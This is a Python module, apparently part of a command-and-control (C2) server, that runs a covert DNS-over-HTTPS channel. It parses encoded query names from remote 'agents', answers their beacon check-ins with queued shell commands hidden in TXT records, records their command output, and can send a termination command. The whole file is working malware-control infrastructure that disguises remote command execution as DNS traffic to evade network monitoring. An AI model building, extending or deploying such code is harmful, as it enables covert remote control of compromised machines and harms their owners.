#!/usr/bin/env python3
"""
DNS-over-HTTPS Handler Module
Handles DoH queries from agents and manages communication
"""

import base64
import json
import re
from .session_manager import SessionManager


class DoHHandler:
    """DNS-over-HTTPS request handler."""
    
    def __init__(self, session_manager):
        """
        Initialize DoH handler.
        
        Args:
            session_manager: SessionManager instance
        """
        self.session_manager = session_manager
    
    def parse_query_name(self, query_name, domain):
        """
        Parse DNS query name to extract session and data.
        
        Format: {message_type}.{chunk_id}.{data}.{session_id}.{domain}
        
        Args:
            query_name: DNS query name
            domain: Expected domain name
            
        Returns:
            dict: Parsed query data or None if invalid
        """
        try:
            # Remove domain suffix
            if query_name.endswith('.' + domain):
                query_name = query_name[:-len('.' + domain)]
            elif query_name.endswith(domain):
                query_name = query_name[:-len(domain)]
            
            # Split by dots
            parts = query_name.split('.')
            
            if len(parts) < 4:
                return None
            
            # Extract components (reverse order due to DNS structure)
            # Format: message_type.chunk_id.data.session_id
            session_id_part = parts[-1] if len(parts) >= 1 else None
            data_part = '.'.join(parts[2:-1]) if len(parts) > 3 else None
            chunk_id = parts[1] if len(parts) > 1 else None
            message_type = parts[0] if len(parts) > 0 else None
            
            # Reconstruct session ID (may have been split)
            # Session ID is typically in the last part before domain
            session_id = session_id_part
            
            return {
                'message_type': message_type,
                'chunk_id': chunk_id,
                'data': data_part,
                'session_id': session_id
            }
        except Exception:
            return None
    
    def decode_data(self, encoded_data):
        """
        Decode data from DNS-safe encoding.
        
        Args:
            encoded_data: Encoded data string
            
        Returns:
            bytes: Decoded data
        """
        try:
            # Restore base64 characters
            encoded_data = encoded_data.replace('-', '+').replace('_', '/')
            
            # Add padding if needed
            padding = 4 - (len(encoded_data) % 4)
            if padding != 4:
                encoded_data += '=' * padding
            
            return base64.urlsafe_b64decode(encoded_data)
        except Exception:
            return b''
    
    def handle_beacon(self, session_id):
        """
        Handle agent beacon (check-in).
        
        Args:
            session_id: Session identifier
            
        Returns:
            dict: Response data for DNS TXT record
        """
        # Check if session was deleted
        if self.session_manager.is_session_deleted(session_id):
            # Return termination command
            command_data = {
                'session_id': session_id,
                'command': '__TERMINATE__'
            }
            
            encoded = base64.urlsafe_b64encode(
                json.dumps(command_data).encode('utf-8')
            ).decode('ascii').rstrip('=')
            
            return {
                'type': 'TXT',
                'data': encoded
            }
        
        # Update last seen
        self.session_manager.update_last_seen(session_id)
        
        # Get next command from queue
        command = self.session_manager.get_next_command(session_id)
        
        if command:
            # Encode command for transmission
            command_data = {
                'session_id': session_id,
                'command': command
            }
            
            encoded = base64.urlsafe_b64encode(
                json.dumps(command_data).encode('utf-8')
            ).decode('ascii').rstrip('=')
            
            return {
                'type': 'TXT',
                'data': encoded
            }
        else:
            # No command, return empty response
            return {
                'type': 'TXT',
                'data': ''
            }
    
    def handle_response(self, session_id, response_data):
        """
        Handle agent response.
        
        Args:
            session_id: Session identifier
            response_data: Response data from agent
            
        Returns:
            dict: Acknowledgment response
        """
        try:
            # Decode response
            decoded = self.decode_data(response_data)
            response_text = decoded.decode('utf-8', errors='ignore')
            
            # Parse response (format: RETCODE:X\nCWD:path\nSTDOUT:...\nSTDERR:...)
            lines = response_text.split('\n')
            retcode = None
            cwd = None
            stdout = ''
            stderr = ''
            command = None
            
            # Track which section we're currently in
            current_section = None
            
            for line in lines:
                if line.startswith('RETCODE:'):
                    retcode = line[8:].strip()
                    current_section = None
                elif line.startswith('CWD:'):
                    cwd = line[4:].strip()
                    current_section = None
                elif line.startswith('STDOUT:'):
                    stdout = line[7:]
                    current_section = 'stdout'
                elif line.startswith('STDERR:'):
                    stderr = line[7:]
                    current_section = 'stderr'
                elif current_section == 'stdout':
                    # Continuation of stdout
                    if stdout:
                        stdout += '\n' + line
                    else:
                        stdout = line
                elif current_section == 'stderr':
                    # Continuation of stderr
                    if stderr:
                        stderr += '\n' + line
                    else:
                        stderr = line
            
            # Ensure retcode is a string (default to '0' if None)
            if retcode is None:
                retcode = '0'
            
            # Get last command for this session (from history)
            history = self.session_manager.get_session_history(session_id, limit=1)
            if history:
                command = history[0].get('command')
            
            # Save response
            if command:
                full_response = f"RETCODE: {retcode}\nCWD: {cwd}\nSTDOUT:\n{stdout}\nSTDERR:\n{stderr}"
                self.session_manager.save_response(session_id, command, full_response)
            
            return {
                'type': 'TXT',
                'data': 'OK'
            }
        except Exception:
            return {
                'type': 'TXT',
                'data': 'ERROR'
            }
    
    def process_doh_query(self, query_name, query_type, domain):
        """
        Process DNS-over-HTTPS query.
        
        Args:
            query_name: DNS query name
            query_type: DNS query type
            domain: C2 domain name
            
        Returns:
            dict: DNS response data
        """
        # Parse query
        parsed = self.parse_query_name(query_name, domain)
        
        if not parsed:
            return None
        
        session_id = parsed['session_id']
        message_type = parsed['message_type']
        data = parsed.get('data', '')
        
        # Ensure session exists
        session = self.session_manager.get_session(session_id)
        if not session:
            # Create new session
            self.session_manager.create_session(session_id)
        
        # Handle based on message type
        if message_type == 'cmd':
            if data == 'beacon' or not data:
                # Agent checking in
                return self.handle_beacon(session_id)
            else:
                # Other command-related queries
                return self.handle_beacon(session_id)
        elif message_type == 'resp':
            # Agent sending response
            return self.handle_response(session_id, data)
        else:
            # Unknown message type
            return None
    
    def format_dns_response(self, response_data):
        """
        Format DNS response for DoH JSON format.
        
        Args:
            response_data: Response data dict
            
        Returns:
            dict: DNS JSON response
        """
        if not response_data:
            return {
                'Status': 0,
                'Answer': []
            }
        
        answer = {
            'name': 'response',
            'type': 16,  # TXT record
            'TTL': 300,
            'data': response_data.get('data', '')
        }
        
        return {
            'Status': 0,
            'Answer': [answer]
        }

